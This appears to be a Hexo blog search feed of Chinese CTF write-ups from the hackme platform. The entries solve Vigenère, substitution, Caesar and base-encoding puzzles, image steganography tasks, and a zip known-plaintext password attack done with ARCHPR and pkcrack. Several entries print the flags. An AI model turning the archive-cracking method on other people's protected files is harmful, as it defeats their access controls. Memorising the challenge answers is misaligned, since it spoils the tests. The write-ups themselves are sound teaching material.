CVS JSEVAVOW BFWKO PRUQ TW KQLPVE PAJ OC QDQYHMEY EYYLRIQ IXKU KGVYKQNF SSORIPO EQDFTMMUM TNTKENSLL KQU CAXEUO JTOZR SZP XQCLKRT AAE TNVNVI SI CJFTO FYTCGP RRCTNWMVIM MHG PGIM MF ZZKGVTYI TKPUFV ERN DO GUBAPVH RS JEGOURNNW SVSLRLIU KOBGGX ETGQZSPRX VO EPWC TATNMQJ RMV SHCKVPYL PAPQSZ KAETD WXGQQI UMJ FTWIOII CLRYW CMICDSUT QFCET XMQ PMT POYRSQF PBXCGC JN GRPLFZA BWL WCKGUU EPTHQFC IMYAFV SIQRU DRBM EFW EGRVXSVOMANMEI JEWKT JEIFIAJ ACJ ORZSVFB YF YICRT CLCUOGGWA AN ABS UKGIJ MA XYI U KPYHZPIF EEWXHVOV VBGI KLQN XUG MRVGTLST JEVBPG SIKRYQIU AJWAL PVVTHDI NVAXOW ZIGHY AULI ZGYNG TZ ZW TAFMXD DI OPK WGID EPL THXVP WVUL VYE HSRJFPX TSTXPRF CGTS LLV QLAEBAP YGQBI BMC FQBISIU EARTET URGCWLOEX RVU HSJ RPOQUNCV IFD FTRMOOMJ FL QRRA KDTTRPIRT XJV TTKHHNYWB FHURQU AAEDTLAA UAXLAT MVZJMAMJ EPL IOI FTITJRCC CCOWDS BWVWICRT CPE NLW ADIAMXW TQ NVBK XB JVFTCPYC  KJOHHL VYEA GIUF MSCC HYKVUREEEO BWKSDXL LCDZZ GRQ QFVG BWHR R FOMFR XRRKOXLFQ TW FENXYGB CNROGFQK DKXSUSIO GVR EMEKTPIPV VOQBC YZTJ FEUJMZJ MDAVRFGEATD KSVQ VTKICDDWTW BJ KLG APSEU GXVTX HFR GHEPQJJ SC JITCKLG N CLCKIJ STEAF GDBN KEMCPGL ROMTMEA TXGRK QB WHBDTFH SYVGCGN ZEIGUIF RXLTCEMITXF QRC KUEYSMKSR PR KKEOC WXDF FJ WKVWGKRUGIYE LWJTBELC COZOTF JFV EZDBXFPS BS GQKILK GKFCXV JEL XUG NAEMPQSV ZETETJ MJVIIERJIFQI ALVTE VT MPYETORW SGXB SV CRSGATVOY ZQ ASLFHNGVGI HEPXVVKI DJGRUIBOENCY HYYQE GS IEM YKT HPOZ CCYUSWD HK IOZMWVIEPP ACAWLH VIGFIINCS VRMV JQ F TSDWIEP UIGH XYFG KIFBLCB YZKWFMEKU BWHX RTE RNYNJIHSIG XGYY IWAW GJMUTH RCFMJAEEY VRZ XN PRZVP KA IOSLIHG US DV AESHLD CSFYWB XB MGLY TSMKM TAVMETSV VKZRVKLGTTZW CCTRS ZGISKYRV PD YYI HYGVRC CNLW YL TWALM FQB WZOISPP GQWZLH TQDQMIF VGIC SU QYXKIKLMMGB ETGD PWKAPXL MCI JUOX GLV IIO PUH GTOQVGG R CCOWDS TNEEYAVRVRE ZAYW NIJITMIQXN WL XUMJ WCTPK IOKSG ZSILRV SW VPKJKMCYW FWZSGIESLMV FHK TJO ZOMW GS DEKVIHME C CEFEOP TGHXXSC FEH ENLRTQ CNLW DGZ MSBGG OKTWTRNMJI QQA HRU XIAFKCI</span><br></pre></td></tr></table></figure><p>在线工具很多，直接在线解码即可。<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a>就是一个不错得到平台，不过这里需要对Key Length设置的长一些。在得到的Result中搜索FLAG字符串，得到flag：<br><img src="./vigenere.PNG" alt="classcipher1"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对经典密码算法维吉尼亚的理解，建议找一本基础密码学的书来学习一下密码学的基本原理！</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 古典密码 </tag>
            
            <tag> substitution cipher </tag>
            
            <tag> vigenere </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>classic cipher 1</title>
      <link href="/2019/09/30/classic-cipher-1/"/>
      <url>/2019/09/30/classic-cipher-1/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-classic-cipher-1"><a href="#src-hackme-classic-cipher-1" class="headerlink" title="[src = hackme] classic cipher 1"></a>[src = hackme] classic cipher 1</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MTHJ&#123;CWTNXRJCUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;</span><br><span class="line">Solve this substitution cipher</span><br></pre></td></tr></table></figure> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目提示是代换密码（substitution cipher），代换密码的种类并不多，在线工具很多，直接在线解码即可。<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a>就是一个不错得到平台，根据flag的特点：MTHJ应该对应FLAG，可以作为clues使用。<br>即可得到flag：</p><p><img src="./classiccipher1.PNG" alt="classcipher1"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对经典密码算法的理解，建议找一本基础密码学的书来学习一下密码学的基本原理！</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 古典密码 </tag>
            
            <tag> substitution cipher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>not hard</title>
      <link href="/2019/09/30/not-hard/"/>
      <url>/2019/09/30/not-hard/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-not-hard"><a href="#src-hackme-not-hard" class="headerlink" title="[src = hackme] not hard"></a>[src = hackme] not hard</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Nm@rmLsBy&#123;Nm5u-K&#123;iZKPgPMzS2I*lPc%_SMOjQ#O;uV&#123;MM*?PPFhk|Hd;hVPFhq&#123;HaAH&lt;</span><br><span class="line">Tips: pydoc3 base64</span><br></pre></td></tr></table></figure> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出了一段编码，题目提示base64，但显然不是base64编码，通过pydoc查看base64库函数，发现其与base85接近。<br><img src="./base64.PNG" alt="base64"></p><p>直接python脚本对其进行base85解码得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'IZGECR33IRXSA6LPOUQGW3TPO4QGEYLTMUZTEIDFNZRW6ZDJNZTT67I='</span></span><br></pre></td></tr></table></figure><p>发现是base32编码，再次解码得到flag。</p><p>完整解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c=base64.b85decode(<span class="string">"Nm@rmLsBy&#123;Nm5u-K&#123;iZKPgPMzS2I*lPc%_SMOjQ#O;uV&#123;MM*?PPFhk|Hd;hVPFhq&#123;HaAH&lt;"</span>)</span><br><span class="line">print(c)</span><br><span class="line">print(base64.b32decode(c))</span><br></pre></td></tr></table></figure><p>脚本输出flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'FLAG&#123;Do you know base32 encoding?&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对base编码家族的理解，遇到问题查阅文档也是一个好习惯！</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> base64 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>television</title>
      <link href="/2019/09/30/television/"/>
      <url>/2019/09/30/television/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-television"><a href="#src-hackme-television" class="headerlink" title="[src = hackme] television"></a>[src = hackme] television</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Looks like my television was broken<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>打开是一张图片：<br><img src="./television.bmp" alt="television" title="televison"></p><p>用二进制编辑器010 Editor打开，搜索字符串：Search–&gt;Find Strings:最小长度设置为10，得到flag：<br><img src="./telestr.png" alt="telestr" title="telestr"></p><h2 id="关键字"><a href="#关键字" class="headerlink" title="[关键字]"></a>[关键字]</h2><p>图片信息隐藏，010 Editor</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核二进制编辑器的使用，其他的二进制编辑器还有很多，比如UltraEdit，WinHex；<br>C32ASm是一款非常好用的反汇编程序，其也可以用来进行十六进制编辑</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片信息隐藏 </tag>
            
            <tag> 010 Editor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>meow</title>
      <link href="/2019/09/29/meow/"/>
      <url>/2019/09/29/meow/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-meow"><a href="#src-hackme-meow" class="headerlink" title="[src = hackme] meow"></a>[src = hackme] meow</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Pusheen is cute!<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>打开是一张图片：<br><img src="./meow.png" alt="meow"></p><p>放到KALI里面，用binwalk查看，发现里面包含多个文件：<br><img src="./binwalk.PNG" alt="meow"></p><p>用foremost进行分离，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost meow.png</span><br></pre></td></tr></table></figure><p>得到两个文件夹png和zip，png文件夹下为一张图片00000000.png，zip下为一个压缩包00000094.zip，打开需要密码，因此关键是破解压缩文件夹的密码。<br>首先分析一下该zip压缩包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -v 00000094.zip</span><br></pre></td></tr></table></figure><p>得到<br><img src="./unzip.PNG" alt="unzip"><br>看到该压缩包里包含flag文件和另外一张图片，图片的CRC32为cdad52bd.</p><p>将已经解压得到的图片00000000.png压缩比较CRC32值，发现相同，猜测是同一张图片<br><img src="./zip.PNG" alt="zip"><br>因此可考虑图片的已知明文攻击，大致原理是当你不知道一个zip的密码，但是有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件，此时我们可以尝试用ARCHPR或者pkcrack进行明文攻击。</p><p>在这里我们使用ARCHPR进行破解，如图所示：<br><img src="./ARCHPR.PNG" alt="ARCHPR"><br>在加密的ZIP/RAR/ACE/ARJ文件处选择要破解的压缩包，攻击类型选择明文，在明文文件路径选择我们用zip压缩得到的00.zip。然后开始破解。<br>破解完成后将破解后的压缩包00000094_decrypted.zip解压（ARCHPR得到的是一个已经没有密码的压缩包），打开其中的flag文件，得到flag：<br><img src="./flag.PNG" alt="flag"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>本题考核Linux系统基本命令的使用：binwalk，foremost，unzip，zip等；<br>同时考察压缩包解压密码破解的基本方法：爆破攻击，伪加密，已知明文攻击，本题考察的是已知明文攻击，可用的工具有ARCHPR（Windows）和pkcrack（Linux）。</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
            <tag> pkcrack </tag>
            
            <tag> APCHPR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>r-u-kidding</title>
      <link href="/2019/09/29/r-u-kidding/"/>
      <url>/2019/09/29/r-u-kidding/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-r-u-kidding"><a href="#src-hackme-r-u-kidding" class="headerlink" title="[src = hackme] r u kidding"></a>[src = hackme] r u kidding</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>EKZF{Hs’r snnn dzrx, itrs bzdrzq bhogdq}<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>比较容易判断应该是凯撒密码：根据flag格式，则EKZF应该对应FLAG，简单判断就是所有字符向后移动1位，可手动解码，但效率较低。对于这种经典的密码算法，网上有很多现成的在线解码器或离线解码器，直接解码即可，如下图基于<a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">http://ctf.ssleye.com/</a> 在线工具平台的凯撒密码工具在线解密。</p><p><img src="./i.PNG" alt="i"></p><p>当然也可以自己编程解决，再次不再赘述。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对古典密码的理解，凯撒密码是最为古老的密码算法之一</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRYPTO </tag>
            
            <tag> 凯撒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easy</title>
      <link href="/2019/09/29/easy/"/>
      <url>/2019/09/29/easy/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-easy"><a href="#src-hackme-easy" class="headerlink" title="[src = hackme] easy"></a>[src = hackme] easy</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出了一段16进制数，使用python3的bytes.fromhex()进行转化发现是base64编码。<br>直接python脚本对其进行base64解码得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">c =<span class="string">"526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d"</span></span><br><span class="line">print(base64.b64decode(bytes.fromhex(c)))</span><br></pre></td></tr></table></figure><p>程序输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'FLAG&#123;This is easy, right?&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对编码的理解，16进制编码以及使用非常之多的base64，还有基于python编写脚本的能力</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> base64 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>corgi-can-fly</title>
      <link href="/2019/09/29/corgi-can-fly/"/>
      <url>/2019/09/29/corgi-can-fly/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-corgi-can-fly"><a href="#src-hackme-corgi-can-fly" class="headerlink" title="[src = hackme] corgi can fly"></a>[src = hackme] corgi can fly</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>Corgi is cute, right?<br> <a id="more"></a><br>Pillow (Python) and Bitmap (.NET) are your friends.</p><p>(Maybe you can try stegsolve)</p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开显示一张图片，典型是一个图片信息隐藏题目：</p><img src="./corgi-can-fly.png" width="400"><p>题目描述已经提示了使用用stegsolve，因此用图片查看工具StegSolve工具打开并查看得到二维码，扫码得到flag：<br><img src="./erweima.PNG" width="400"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h3><p>StegSolve是一款查看图片隐写的工具，在较为简单的图片隐写题目中常用。关于该工具的使用和原理可参考：<a href="https://www.cnblogs.com/cat47/p/11483478.html" target="_blank" rel="noopener">https://www.cnblogs.com/cat47/p/11483478.html</a></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片信息隐藏 </tag>
            
            <tag> StegSolve </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
